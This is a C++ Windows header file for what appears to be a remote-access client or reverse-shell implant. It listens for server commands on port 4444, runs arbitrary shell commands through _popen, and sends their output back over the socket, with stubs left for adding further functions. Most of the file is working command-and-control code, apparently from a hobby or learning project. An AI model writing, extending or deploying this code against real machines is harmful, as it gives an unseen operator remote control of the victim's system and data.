#pragma once
#ifndef CLIENT_H
#define CLIENT_H
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <windows.h>
#define PORT 4444                      // Global defintion of binding port for Client
#define BUFFER_SIZE 12900               // Global definition of buffer size for Client
bool handleservercommands;

// Get Working directory handling
std::string getCurrentDirectory() {
    char buffer[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, buffer);
    return std::string(buffer);
}
// Option one remote shell handling 
void executeCommand(SOCKET clientSocket, const std::string& command) {
    // Handle 'pwd' command
    if (command == "pwd") {
        std::string currentDir = getCurrentDirectory() + "\nEND";
        send(clientSocket, currentDir.c_str(), currentDir.size(), 0);
        return;
    }
    // Handle 'cd' command
    if (command.rfind("cd ", 0) == 0) {
        std::string path = command.substr(3); // Extract the path after 'cd '
        if (SetCurrentDirectoryA(path.c_str())) {
            std::string successMsg = "Changed directory to: " + getCurrentDirectory() + "\nEND";
            send(clientSocket, successMsg.c_str(), successMsg.size(), 0);
        }
        else {
            std::string errorMsg = "Error: Failed to change directory to " + path + "\nEND";
            send(clientSocket, errorMsg.c_str(), errorMsg.size(), 0);
        }
        return;
    }
    // Execute other commands (like dir, ipconfig)
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        std::string errorMsg = "Error: Failed to run command\nEND";
        send(clientSocket, errorMsg.c_str(), errorMsg.size(), 0);
        return;
    }
    char buffer[BUFFER_SIZE];
    std::string fullOutput;
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        send(clientSocket, buffer, strlen(buffer), 0); // Send each chunk immediately
    }
    _pclose(pipe);
    // Send end signal to mark completion
    const char* endSignal = "END";
    send(clientSocket, endSignal, strlen(endSignal), 0);
}
//CommandPrompt Handler
void CommandPrompt(SOCKET clientSocket) {
    bool cmd = true;
    std::string command;
    while (cmd) {
        std::cout << "Entered cmd loop Line 61\n";
        char recvBuffer[BUFFER_SIZE];
        memset(recvBuffer, 0, sizeof(recvBuffer));
        int bytesReceived = recv(clientSocket, recvBuffer, sizeof(recvBuffer) - 1, 0);
        if (bytesReceived <= 0) break;
        recvBuffer[bytesReceived] = '\0';
        command = recvBuffer;
        if (command == "exit") {
            std::string exitMsg = "Client shutting down.\nEND";
            send(clientSocket, exitMsg.c_str(), exitMsg.size(), 0); //close socket here 
            cmd = false;
            handleservercommands = false;
            break;
        }
        else if (command == "back") {
            std::cout << "Exited cmd loop Line 74\n";
            cmd = false;
            break;
        }
        executeCommand(clientSocket, command);
    }
}

//HandleServerCommand
void HandleServerCommand(SOCKET clientSocket) {
    std::string ServerCommand;
    handleservercommands = true;
    while (handleservercommands) {
        std::cout << "Entered handleservercommand loop Line 95\n";
        char charbuffer[BUFFER_SIZE];
        memset(charbuffer, 0, sizeof(charbuffer));
        int bytesReceived = recv(clientSocket, charbuffer, sizeof(charbuffer) - 1, 0);
        if (bytesReceived <= 0) {
            std::cout << "Server Disconnected. Attempting Reconnection\n";
            break;
        }
        charbuffer[bytesReceived] = '\0';
        std::string ServerCommand(charbuffer);

        if (ServerCommand == "1") {
            CommandPrompt(clientSocket); //synchronous operation wait for CommandPrompt to finish 
        }
        else if (ServerCommand == "2") {
            //Add later Functions to be implemented
        }
        else if (ServerCommand == "exit") {
            std::string exitMsg = "Client shutting down.\nEND";
            send(clientSocket, exitMsg.c_str(), exitMsg.size(), 0); //close socket here 
            handleservercommands = false;
            break;
        }
        else {
            std::cout << "Else Invoked via handleservercommand loop Line 105\n";
        }
    }
   
}

#endif //CLIENT_H